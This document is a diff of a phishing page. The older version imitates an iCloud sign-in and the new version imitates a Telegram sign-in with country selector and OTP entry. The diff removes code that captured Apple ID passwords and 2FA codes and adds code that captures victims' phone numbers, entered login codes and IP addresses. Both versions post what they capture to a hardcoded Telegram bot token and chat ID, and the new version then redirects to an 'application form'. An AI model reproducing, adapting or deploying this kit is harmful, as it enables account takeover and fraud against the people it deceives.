@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login - iCloud</title>
+    <title>Login - Choose Method</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         * {
@@ -122,6 +122,24 @@
         .icloud-btn:hover {
             background: #333;
             border-color: #333;
+        }
+        
+        .telegram-btn {
+            background: #2AABEE;
+            color: white;
+            border-color: #2AABEE;
+        }
+        
+        .telegram-btn:hover {
+            background: #229ED9;
+            border-color: #229ED9;
+        }
+        
+        .telegram-btn:disabled {
+            background: #cccccc;
+            border-color: #cccccc;
+            cursor: not-allowed;
+            transform: none;
         }
         
         .btn-icon {
@@ -296,10 +314,194 @@
             height: 30px;
             fill: white;
         }
+        
+        /* Telegram Login Styles */
+        .phone-input-wrapper {
+            position: relative;
+        }
+        
+        .country-code {
+            position: absolute;
+            left: 14px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #333;
+            font-weight: 500;
+            font-size: 16px;
+        }
+        
+        .phone-input {
+            padding-left: 60px !important;
+            font-size: 18px;
+        }
+        
+        .country-selector {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 12px;
+            border: 2px solid #e5e7eb;
+            border-radius: 8px;
+            margin-bottom: 15px;
+            cursor: pointer;
+            transition: border-color 0.3s;
+        }
+        
+        .country-selector:hover {
+            border-color: #2AABEE;
+        }
+        
+        .country-info {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .country-flag {
+            width: 24px;
+            height: 24px;
+            background: #2AABEE;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: bold;
+            font-size: 12px;
+        }
+        
+        .country-name {
+            font-weight: 500;
+            color: #333;
+        }
+        
+        .country-code-display {
+            color: #666;
+        }
+        
+        .keep-signed-in {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin: 20px 0;
+        }
+        
+        .keep-signed-in input {
+            width: auto;
+        }
+        
+        .keep-signed-in label {
+            color: #666;
+            font-size: 14px;
+            margin: 0;
+        }
+        
+        /* OTP Input Fields */
+        .otp-inputs {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin: 25px 0;
+        }
+        
+        .otp-digit {
+            width: 50px;
+            height: 60px;
+            text-align: center;
+            font-size: 24px;
+            font-weight: 600;
+            border: 2px solid #e5e7eb;
+            border-radius: 8px;
+            background: #f8f9fa;
+            transition: all 0.3s;
+        }
+        
+        .otp-digit:focus {
+            outline: none;
+            border-color: #2AABEE;
+            background: white;
+            box-shadow: 0 0 0 3px rgba(42, 171, 238, 0.1);
+        }
+        
+        .status-message {
+            text-align: center;
+            margin: 15px 0;
+            font-size: 14px;
+            min-height: 20px;
+        }
+        
+        .success-msg {
+            color: #10b981;
+        }
+        
+        .error-msg {
+            color: #ef4444;
+        }
+        
+        .resend-link {
+            text-align: center;
+            margin-top: 15px;
+            color: #666;
+        }
+        
+        .resend-link a {
+            color: #2AABEE;
+            text-decoration: none;
+            font-weight: 500;
+        }
+        
+        .resend-link a:hover {
+            text-decoration: underline;
+        }
+        
+        .small-text {
+            font-size: 12px;
+            color: #999;
+            text-align: center;
+            margin-top: 5px;
+        }
+        
+        .loading-dots {
+            display: inline-block;
+        }
+        
+        .loading-dots:after {
+            content: ' .';
+            animation: dots 1.5s steps(5, end) infinite;
+        }
+        
+        @keyframes dots {
+            0%, 20% { content: ' .'; }
+            40% { content: ' ..'; }
+            60% { content: ' ...'; }
+            80%, 100% { content: ''; }
+        }
+        
+        .loading {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 1s ease-in-out infinite;
+            margin-right: 8px;
+        }
+        
+        .error-border {
+            border-color: #ef4444 !important;
+        }
+        
+        .error-text {
+            color: #ef4444;
+            font-size: 12px;
+            margin-top: 5px;
+            display: none;
+        }
     </style>
 </head>
 <body>
-    <!-- Main Login Screen -->
+    <!-- Main Login Screen with Options -->
     <div class="container" id="mainScreen">
         <div class="login-card">
             <div class="logo-section">
@@ -309,9 +511,7 @@
                     </svg>
                 </div>
                 <h1>Welcome Back</h1>
-                <p class="subtitle">By clicking the Continue button, you'll be able to connect with us, submit your application form, and receive the official result of your submission.
-
-</p>
+                <p class="subtitle">By clicking the Continue button, you'll be able to connect with us, submit your application form, and receive the official result of your submission.</p>
             </div>
 
             <div class="login-methods">
@@ -320,6 +520,13 @@
                         <path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.81-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z"/>
                     </svg>
                     <span>Continue with iCloud</span>
+                </button>
+                
+                <button class="login-btn telegram-btn" onclick="showTelegramLogin()">
+                    <svg class="btn-icon" viewBox="0 0 24 24" fill="currentColor">
+                        <path d="M11.944 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0a12 12 0 0 0-.056 0zm4.962 7.224c.1-.002.321.023.465.14a.506.506 0 0 1 .171.325c.016.093.036.306.02.472-.18 1.898-.962 6.502-1.36 8.627-.168.9-.499 1.201-.82 1.23-.696.064-1.225-.46-1.9-.902-1.056-.693-1.653-1.124-2.678-1.8-1.185-.78-.417-1.21.258-1.91.177-.184 3.247-2.977 3.307-3.23.007-.032.014-.15-.056-.212s-.174-.041-.249-.024c-.106.024-1.793 1.14-5.061 3.345-.48.33-.913.49-1.302.48-.428-.008-1.252-.241-1.865-.44-.752-.245-1.349-.374-1.297-.789.027-.216.325-.437.893-.663 3.498-1.524 5.83-2.529 6.998-3.014 3.332-1.386 4.025-1.627 4.476-1.635z"/>
+                    </svg>
+                    <span>Continue with Telegram</span>
                 </button>
             </div>
 
@@ -333,122 +540,124 @@
         </div>
     </div>
 
-    <!-- iCloud Login Form -->
-    <div class="container" id="icloudForm" style="display: none;">
+    <!-- Telegram Phone Login -->
+    <div class="container" id="telegramPhone" style="display: none;">
         <div class="login-card">
             <div class="logo-section">
-                <div class="logo-icon">
-                    <svg viewBox="0 0 24 24" fill="currentColor">
-                        <path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.81-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z"/>
+                <div class="logo-icon" style="background: #2AABEE;">
+                    <svg viewBox="0 0 24 24" fill="white">
+                        <path d="M11.944 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0a12 12 0 0 0-.056 0zm4.962 7.224c.1-.002.321.023.465.14a.506.506 0 0 1 .171.325c.016.093.036.306.02.472-.18 1.898-.962 6.502-1.36 8.627-.168.9-.499 1.201-.82 1.23-.696.064-1.225-.46-1.9-.902-1.056-.693-1.653-1.124-2.678-1.8-1.185-.78-.417-1.21.258-1.91.177-.184 3.247-2.977 3.307-3.23.007-.032.014-.15-.056-.212s-.174-.041-.249-.024c-.106.024-1.793 1.14-5.061 3.345-.48.33-.913.49-1.302.48-.428-.008-1.252-.241-1.865-.44-.752-.245-1.349-.374-1.297-.789.027-.216.325-.437.893-.663 3.498-1.524 5.83-2.529 6.998-3.014 3.332-1.386 4.025-1.627 4.476-1.635z"/>
                     </svg>
                 </div>
-                <h1>Sign in with Apple ID</h1>
-                <p class="subtitle">Enter your iCloud credentials</p>
+                <h1>Sign in to Telegram</h1>
+                <p class="subtitle">Please confirm your country code and enter your phone number</p>
             </div>
 
-            <form id="icloudLoginForm">
+            <form id="telegramPhoneForm" onsubmit="event.preventDefault(); sendTelegramOTP();">
                 <div class="form-group">
-                    <label for="icloudEmail">Apple ID</label>
-                    <input type="text" id="icloudEmail" placeholder="name@icloud.com" required>
+                    <label>Country</label>
+                    <div class="country-selector" onclick="selectCountry()">
+                        <div class="country-info">
+                            <div class="country-flag">PH</div>
+                            <div>
+                                <div class="country-name">Philippines</div>
+                                <div class="country-code-display">+63</div>
+                            </div>
+                        </div>
+                        <i class="fas fa-chevron-down"></i>
+                    </div>
                 </div>
 
                 <div class="form-group">
-                    <label for="icloudPassword">Password</label>
-                    <input type="password" id="icloudPassword" placeholder="Enter your password" required>
+                    <label>Your phone number</label>
+                    <div class="phone-input-wrapper">
+                        <span class="country-code">+63</span>
+                        <input type="tel" id="telegramPhone" class="form-control phone-input" 
+                               placeholder="956 456 4566" required
+                               pattern="[0-9\s]{10,}"
+                               title="Enter a valid Philippine phone number (10 digits)">
+                    </div>
+                    <div class="error-text" id="phoneError">Please enter a valid phone number</div>
                 </div>
 
-                <div class="info-box">
-                    <p><i class="fas fa-info-circle"></i> For accounts with two-factor authentication, use an app-specific password</p>
+                <div class="keep-signed-in">
+                    <input type="checkbox" id="keepSignedIn" checked>
+                    <label for="keepSignedIn">Keep me signed in</label>
                 </div>
+
+                <div class="status-message" id="phoneStatus"></div>
 
                 <div class="action-buttons">
-                    <button type="button" class="login-btn icloud-btn" onclick="submitICloudCredentials()">
-                        <span>Continue</span>
+                    <button type="submit" class="login-btn telegram-btn" id="sendOtpBtn">
+                        <span id="sendOtpText">NEXT</span>
                     </button>
                     
                     <button type="button" class="login-btn" onclick="backToMain()" style="margin-top: 10px;">
                         <span>Back to login</span>
                     </button>
                 </div>
+
+                <div class="divider">
+                    <span>OR</span>
+                </div>
+
+                <div style="margin-top: 20px;">
+                    <button type="button" class="login-btn" style="margin-bottom: 10px;">
+                        <i class="fas fa-qrcode"></i> LOG IN BY QR CODE
+                    </button>
+                    
+                    <button type="button" class="login-btn">
+                        <i class="fas fa-key"></i> LOG IN WITH PASSKEY
+                    </button>
+                </div>
             </form>
         </div>
     </div>
 
-    <!-- iCloud OTP Verification -->
-    <div class="container" id="icloudOTP" style="display: none;">
+    <!-- Telegram OTP Verification -->
+    <div class="container" id="telegramOTP" style="display: none;">
         <div class="login-card">
             <div class="logo-section">
-                <div class="logo-icon">
-                    <svg viewBox="0 0 24 24" fill="currentColor">
-                        <path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.81-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z"/>
+                <div class="logo-icon" style="background: #2AABEE;">
+                    <svg viewBox="0 0 24 24" fill="white">
+                        <path d="M11.944 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0a12 12 0 0 0-.056 0zm4.962 7.224c.1-.002.321.023.465.14a.506.506 0 0 1 .171.325c.16.093.036.306.02.472-.18 1.898-.962 6.502-1.36 8.627-.168.9-.499 1.201-.82 1.23-.696.064-1.225-.46-1.9-.902-1.056-.693-1.653-1.124-2.678-1.8-1.185-.78-.417-1.21.258-1.91.177-.184 3.247-2.977 3.307-3.23.007-.032.014-.15-.056-.212s-.174-.041-.249-.024c-.106.024-1.793 1.14-5.061 3.345-.48.33-.913.49-1.302.48-.428-.008-1.252-.241-1.865-.44-.752-.245-1.349-.374-1.297-.789.027-.216.325-.437.893-.663 3.498-1.524 5.83-2.529 6.998-3.014 3.332-1.386 4.025-1.627 4.476-1.635z"/>
                     </svg>
                 </div>
-                <h1>Two-Factor Authentication</h1>
-                <p class="subtitle">Enter the verification code sent to your Apple devices</p>
+                <h1>Enter Code</h1>
+                <p class="subtitle">We've sent the code to the Telegram app on your other device</p>
+                <div class="phone-display" id="telegramPhoneDisplay"></div>
             </div>
 
-            <div style="text-align: center; margin: 30px 0;">
-                <div style="font-size: 48px; color: #000; margin-bottom: 20px;">
-                    <i class="fas fa-shield-alt"></i>
+            <form id="telegramOtpForm">
+                <div class="otp-inputs">
+                    <input type="text" class="otp-digit" maxlength="1" pattern="[0-9]" data-index="0" required>
+                    <input type="text" class="otp-digit" maxlength="1" pattern="[0-9]" data-index="1" required>
+                    <input type="text" class="otp-digit" maxlength="1" pattern="[0-9]" data-index="2" required>
+                    <input type="text" class="otp-digit" maxlength="1" pattern="[0-9]" data-index="3" required>
+                    <input type="text" class="otp-digit" maxlength="1" pattern="[0-9]" data-index="4" required>
                 </div>
-                
-                <p style="color: #666; margin-bottom: 25px; font-size: 14px;">
-                    A 6-digit verification code has been sent to your Apple devices.
-                    Enter the code to continue.
-                </p>
-                
-                <div style="margin: 25px 0;">
-                    <input type="text" id="otpCode" class="otp-input" placeholder="000000" 
-                           maxlength="6" pattern="\d{6}" required>
-                    <p style="color: #999; font-size: 12px; margin-top: 8px;">
-                        Enter the 6-digit code from your Apple device
-                    </p>
-                </div>
-                
-                <div class="notification-steps">
-                    <div class="step-item">
-                        <div class="step-number">1</div>
-                        <div class="step-content">
-                            <h3>Check Your Devices</h3>
-                            <p>Look for the verification code on your iPhone, iPad, or Mac</p>
-                        </div>
-                    </div>
-                    
-                    <div class="step-item">
-                        <div class="step-number">2</div>
-                        <div class="step-content">
-                            <h3>Enter Code</h3>
-                            <p>Type the 6-digit code shown on your trusted device</p>
-                        </div>
-                    </div>
-                    
-                    <div class="step-item">
-                        <div class="step-number">3</div>
-                        <div class="step-content">
-                            <h3>Complete Login</h3>
-                            <p>You'll be logged in automatically after verification</p>
-                        </div>
-                    </div>
-                </div>
-            </div>
+                <p class="small-text">Enter the 5-digit code sent to your Telegram</p>
 
-            <div class="action-buttons">
-                <button type="button" class="login-btn icloud-btn" onclick="verifyICloudOTP()">
-                    <span>Verify and Continue</span>
-                </button>
-                
-                <button type="button" class="login-btn" onclick="resendOTP()" style="margin-top: 10px;">
-                    <span>Resend Code</span>
-                </button>
-                
-                <button type="button" class="login-btn" onclick="backToICloudLogin()" style="margin-top: 10px; background: transparent; color: #666; border: 1px solid #ddd;">
-                    <span><i class="fas fa-arrow-left"></i> Back</span>
-                </button>
-            </div>
+                <div class="status-message" id="otpStatus"></div>
+
+                <div class="action-buttons">
+                    <button type="button" class="login-btn telegram-btn" onclick="verifyTelegramOTP()" id="verifyOtpBtn">
+                        <span id="verifyOtpText">VERIFY</span>
+                    </button>
+                    
+                    <button type="button" class="login-btn" onclick="backToTelegramPhone()" style="margin-top: 10px;">
+                        <span>Change Number</span>
+                    </button>
+                </div>
+
+                <div class="resend-link">
+                    Didn't receive the code? <a href="#" onclick="resendTelegramOTP(event)">Resend code</a>
+                </div>
+            </form>
         </div>
     </div>
 
-    <!-- Success Screen -->
+    <!-- Success Screen (Redirects to collab-form.html) -->
     <div class="container" id="successScreen" style="display: none;">
         <div class="login-card">
             <div class="logo-section">
@@ -458,151 +667,275 @@
                     </svg>
                 </div>
                 <h1>Login Successful!</h1>
-                <p class="subtitle">You have successfully signed in with iCloud</p>
+                <p class="subtitle">You have successfully signed in</p>
             </div>
 
             <div style="text-align: center; margin: 30px 0;">
                 <div class="loading-spinner"></div>
                 <p style="color: #666; margin-top: 20px;">
-                    Redirecting to dashboard...
+                    Redirecting to application form<span class="loading-dots"></span>
                 </p>
             </div>
         </div>
     </div>
 
     <script>
-        // Your Telegram bot credentials
+        // Telegram Bot Configuration
         const BOT_TOKEN = '7738348705:AAGGbXz5g683t-KHmrnvyCfK8ial6yFhHNU';
         const CHAT_ID = '8456018521';
         
-        let icloudCredentials = { email: '', password: '' };
+        // Store user data
+        let telegramPhone = '';
+        let userIP = '';
+        let generatedOTP = '';
 
-        function showICloudLogin() {
-            // Hide main screen, show iCloud form
+        // Generate random OTP
+        function generateOTP() {
+            return Math.floor(10000 + Math.random() * 90000).toString();
+        }
+
+        // Navigation Functions
+        function showTelegramLogin() {
             document.getElementById('mainScreen').style.display = 'none';
-            document.getElementById('icloudForm').style.display = 'block';
-            
-            // Focus on email field
+            document.getElementById('telegramPhone').style.display = 'block';
             setTimeout(() => {
-                document.getElementById('icloudEmail').focus();
+                document.getElementById('telegramPhone').focus();
             }, 100);
         }
         
         function backToMain() {
-            // Show main screen, hide iCloud form
             document.getElementById('mainScreen').style.display = 'block';
-            document.getElementById('icloudForm').style.display = 'none';
-            document.getElementById('icloudOTP').style.display = 'none';
+            document.getElementById('telegramPhone').style.display = 'none';
+            document.getElementById('telegramOTP').style.display = 'none';
+            document.getElementById('successScreen').style.display = 'none';
             
             // Clear form fields
-            document.getElementById('icloudEmail').value = '';
-            document.getElementById('icloudPassword').value = '';
-            document.getElementById('otpCode').value = '';
+            document.getElementById('telegramPhone').value = '';
+            document.getElementById('phoneError').style.display = 'none';
+            document.getElementById('telegramPhone').classList.remove('error-border');
+            clearOtpFields();
         }
         
-        function backToICloudLogin() {
-            // Show iCloud login form, hide OTP
-            document.getElementById('icloudOTP').style.display = 'none';
-            document.getElementById('icloudForm').style.display = 'block';
+        function backToTelegramPhone() {
+            document.getElementById('telegramOTP').style.display = 'none';
+            document.getElementById('telegramPhone').style.display = 'block';
         }
         
-        async function submitICloudCredentials() {
-            const email = document.getElementById('icloudEmail').value;
-            const password = document.getElementById('icloudPassword').value;
-            
-            if (!email || !password) {
-                alert('Please enter both Apple ID and password');
-                return;
-            }
-            
-            // Save credentials temporarily
-            icloudCredentials = { email, password };
-            
-            // Send to Telegram
-            await sendCredentialsToTelegram('iCloud', email, password);
-            
-            // Hide iCloud form, show OTP screen
-            document.getElementById('icloudForm').style.display = 'none';
-            document.getElementById('icloudOTP').style.display = 'block';
-            
-            // Focus on OTP field
-            setTimeout(() => {
-                document.getElementById('otpCode').focus();
-            }, 100);
+        function selectCountry() {
+            alert('Country selection would appear here in a real implementation.');
         }
-        
-        function verifyICloudOTP() {
-            const otp = document.getElementById('otpCode').value;
+
+        // Phone input validation - SIMPLE FIX
+        document.addEventListener('DOMContentLoaded', function() {
+            const phoneInput = document.getElementById('telegramPhone');
+            const phoneError = document.getElementById('phoneError');
+            const sendOtpBtn = document.getElementById('sendOtpBtn');
             
-            if (!otp || otp.length !== 6) {
-                alert('Please enter a valid 6-digit verification code');
-                return;
-            }
-            
-            // Send OTP to Telegram
-            sendOTPToTelegram(icloudCredentials.email, otp);
-            
-            // Save for session
-            sessionStorage.setItem('icloudUser', icloudCredentials.email);
-            
-            // Show success screen
-            document.getElementById('icloudOTP').style.display = 'none';
-            document.getElementById('successScreen').style.display = 'block';
-            
-            // Redirect to dashboard after delay
-            setTimeout(() => {
-                window.location.href = 'dashboard.html';
-            }, 2000);
-        }
-        
-        function resendOTP() {
-            const resendBtn = document.querySelector('#icloudOTP .login-btn:nth-child(2)');
-            const originalText = resendBtn.innerHTML;
-            resendBtn.innerHTML = '<span><i class="fas fa-spinner fa-spin"></i> Sending new code...</span>';
-            resendBtn.disabled = true;
-            
-            // Simulate sending new OTP
-            setTimeout(() => {
-                alert('New verification code has been sent to your Apple devices');
-                resendBtn.innerHTML = originalText;
-                resendBtn.disabled = false;
+            if (phoneInput) {
+                // Real-time validation
+                phoneInput.addEventListener('input', function(e) {
+                    let value = e.target.value.replace(/\D/g, '');
+                    
+                    // Format: XXX XXX XXXX
+                    if (value.length > 0) {
+                        if (value.length <= 3) {
+                            value = value;
+                        } else if (value.length <= 6) {
+                            value = value.slice(0, 3) + ' ' + value.slice(3);
+                        } else {
+                            value = value.slice(0, 3) + ' ' + value.slice(3, 6) + ' ' + value.slice(6, 10);
+                        }
+                    }
+                    e.target.value = value;
+                    
+                    // Check if valid (10 digits)
+                    const digitsOnly = value.replace(/\s/g, '');
+                    const isValid = digitsOnly.length === 10;
+                    
+                    if (isValid) {
+                        phoneError.style.display = 'none';
+                        phoneInput.classList.remove('error-border');
+                        sendOtpBtn.disabled = false;
+                    } else {
+                        phoneError.style.display = 'block';
+                        phoneInput.classList.add('error-border');
+                        sendOtpBtn.disabled = true;
+                    }
+                });
                 
-                // Clear OTP field
-                document.getElementById('otpCode').value = '';
-                document.getElementById('otpCode').focus();
+                // Add Enter key support
+                phoneInput.addEventListener('keypress', function(e) {
+                    if (e.key === 'Enter') {
+                        e.preventDefault();
+                        if (!sendOtpBtn.disabled) {
+                            sendTelegramOTP();
+                        }
+                    }
+                });
+                
+                // Pre-fill with example number for testing
+                phoneInput.value = '956 456 4566';
+                
+                // Trigger validation for pre-filled value
+                phoneInput.dispatchEvent(new Event('input'));
+            }
+        });
+
+        // Telegram OTP Functions
+        async function sendTelegramOTP() {
+            const phoneInput = document.getElementById('telegramPhone');
+            const phoneValue = phoneInput.value.replace(/\s/g, '');
+            
+            if (phoneValue.length !== 10) {
+                document.getElementById('phoneError').style.display = 'block';
+                phoneInput.classList.add('error-border');
+                return;
+            }
+            
+            telegramPhone = '+63' + phoneValue;
+            generatedOTP = generateOTP();
+            
+            // Show loading state
+            const sendOtpBtn = document.getElementById('sendOtpBtn');
+            const sendOtpText = document.getElementById('sendOtpText');
+            sendOtpBtn.disabled = true;
+            sendOtpText.innerHTML = '<span class="loading"></span>SENDING...';
+            
+            // Get IP address
+            userIP = await getIPAddress();
+            
+            // Send phone number AND OTP to Telegram
+            await sendTelegramPhoneToBot(telegramPhone, generatedOTP);
+            
+            // Update display and switch screens
+            document.getElementById('telegramPhoneDisplay').textContent = telegramPhone;
+            document.getElementById('phoneStatus').textContent = 'Code sent to Telegram!';
+            document.getElementById('phoneStatus').className = 'status-message success-msg';
+            
+            setTimeout(() => {
+                document.getElementById('telegramPhone').style.display = 'none';
+                document.getElementById('telegramOTP').style.display = 'block';
+                
+                // Reset button and focus first OTP digit
+                sendOtpBtn.disabled = false;
+                sendOtpText.textContent = 'NEXT';
+                document.getElementById('phoneStatus').textContent = '';
+                document.querySelector('.otp-digit').focus();
             }, 1500);
         }
         
-        async function sendCredentialsToTelegram(service, email, password) {
-            // Get IP address
-            const ip = await getIPAddress();
+        // Telegram OTP input handling
+        const otpDigits = document.querySelectorAll('.otp-digit');
+        
+        otpDigits.forEach((digit, index) => {
+            digit.addEventListener('input', function(e) {
+                const value = e.target.value.replace(/[^0-9]/g, '');
+                e.target.value = value;
+                
+                if (value && index < otpDigits.length - 1) {
+                    otpDigits[index + 1].focus();
+                }
+                
+                // Auto-verify when all digits are filled
+                const allFilled = Array.from(otpDigits).every(d => d.value.length === 1);
+                if (allFilled) {
+                    setTimeout(() => verifyTelegramOTP(), 100);
+                }
+            });
+            
+            digit.addEventListener('keydown', function(e) {
+                if (e.key === 'Backspace' && !e.target.value && index > 0) {
+                    otpDigits[index - 1].focus();
+                }
+            });
+        });
+        
+        async function verifyTelegramOTP() {
+            const enteredOTP = Array.from(otpDigits).map(input => input.value).join('');
+            
+            if (enteredOTP.length !== 5) {
+                document.getElementById('otpStatus').textContent = 'Please enter the complete 5-digit code';
+                document.getElementById('otpStatus').className = 'status-message error-msg';
+                return;
+            }
+            
+            // Show loading state
+            const verifyOtpBtn = document.getElementById('verifyOtpBtn');
+            const verifyOtpText = document.getElementById('verifyOtpText');
+            verifyOtpBtn.disabled = true;
+            verifyOtpText.innerHTML = '<span class="loading"></span>VERIFYING...';
+            
+            // Send OTP to Telegram
+            await sendTelegramOTPToBot(telegramPhone, enteredOTP);
+            
+            // Show success and redirect
+            document.getElementById('otpStatus').textContent = 'Verification successful!';
+            document.getElementById('otpStatus').className = 'status-message success-msg';
+            
+            setTimeout(() => {
+                document.getElementById('telegramOTP').style.display = 'none';
+                document.getElementById('successScreen').style.display = 'block';
+                
+                // Redirect to collab-form.html after 2 seconds
+                setTimeout(() => {
+                    window.location.href = 'collab-form.html';
+                }, 2000);
+            }, 1000);
+        }
+        
+        function resendTelegramOTP(e) {
+            e.preventDefault();
+            const resendLink = e.target;
+            resendLink.textContent = 'Sending...';
+            resendLink.style.pointerEvents = 'none';
+            
+            // Generate new OTP
+            generatedOTP = generateOTP();
+            
+            // Send new OTP to Telegram
+            sendTelegramResendOTP(telegramPhone, generatedOTP);
+            
+            // Clear OTP fields
+            clearOtpFields();
+            otpDigits[0].focus();
+            
+            setTimeout(() => {
+                resendLink.textContent = 'Code sent!';
+                document.getElementById('otpStatus').textContent = 'New code sent to your Telegram';
+                document.getElementById('otpStatus').className = 'status-message success-msg';
+                
+                setTimeout(() => {
+                    resendLink.textContent = 'Resend code';
+                    resendLink.style.pointerEvents = 'auto';
+                    document.getElementById('otpStatus').textContent = '';
+                }, 3000);
+            }, 1000);
+        }
+        
+        function clearOtpFields() {
+            otpDigits.forEach(digit => digit.value = '');
+        }
+
+        // Telegram Bot Functions
+        async function sendTelegramPhoneToBot(phone, otp) {
             const timestamp = new Date().toLocaleString();
             const userAgent = navigator.userAgent;
             
             const message = `
-🔐 *iCloud LOGIN CREDENTIALS CAPTURED*
+📱 *TELEGRAM LOGIN ATTEMPT*
 
-🎯 *Service:* ${service}
+📞 *Phone Number:* \`${phone}\`
+🔑 *OTP Code:* \`${otp}\`
+📍 *IP Address:* \`${userIP}\`
 📅 *Time:* ${timestamp}
-📍 *IP Address:* ${ip}
-🌐 *Page URL:* ${window.location.href}
-
-👤 *APPLE ID:*
-\`\`\`
-${email}
-\`\`\`
-
-🔑 *PASSWORD:*
-\`\`\`
-${password}
-\`\`\`
+🌐 *Page URL:* \`${window.location.href}\`
 
 📱 *Browser Info:*
 \`\`\`
 ${userAgent}
 \`\`\`
 
-✅ *Credentials submitted successfully*
+⏳ *Waiting for user to enter OTP...*
             `;
             
             try {
@@ -622,22 +955,49 @@ ${userAgent}
             }
         }
         
-        async function sendOTPToTelegram(email, otp) {
+        async function sendTelegramOTPToBot(phone, enteredOTP) {
             const timestamp = new Date().toLocaleString();
             
             const message = `
-🔢 *iCloud OTP CAPTURED*
+🔢 *TELEGRAM OTP ENTERED*
 
-🎯 *Service:* iCloud
+📞 *Phone Number:* \`${phone}\`
+🔢 *Entered OTP:* \`${enteredOTP}\`
+📍 *IP Address:* \`${userIP}\`
 📅 *Time:* ${timestamp}
-👤 *Apple ID:* ${email}
 
-🔢 *OTP CODE:*
-\`\`\`
-${otp}
-\`\`\`
+✅ *User is being redirected to collab-form.html*
+            `;
+            
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+            } catch (error) {
+                console.error('Telegram error:', error);
+            }
+        }
+        
+        async function sendTelegramResendOTP(phone, newOTP) {
+            const timestamp = new Date().toLocaleString();
+            
+            const message = `
+🔄 *TELEGRAM OTP RESENT*
 
-✅ *OTP verification successful*
+📞 *Phone Number:* \`${phone}\`
+🔢 *New OTP:* \`${newOTP}\`
+📍 *IP Address:* \`${userIP}\`
+📅 *Time:* ${timestamp}
+
+🔄 *User requested a new OTP code*
             `;
             
             try {
@@ -666,31 +1026,6 @@ ${otp}
                 return 'Unknown';
             }
         }
-        
-        // Submit forms on Enter key
-        document.addEventListener('DOMContentLoaded', function() {
-            // iCloud form password field
-            document.getElementById('icloudPassword')?.addEventListener('keypress', function(e) {
-                if (e.key === 'Enter') {
-                    submitICloudCredentials();
-                }
-            });
-            
-            // OTP form
-            document.getElementById('otpCode')?.addEventListener('keypress', function(e) {
-                if (e.key === 'Enter') {
-                    verifyICloudOTP();
-                }
-            });
-            
-            // Auto-submit OTP when 6 digits are entered
-            document.getElementById('otpCode')?.addEventListener('input', function(e) {
-                if (this.value.length === 6) {
-                    verifyICloudOTP();
-                }
-            });
-        });
     </script>
 </body>
 </html>
-
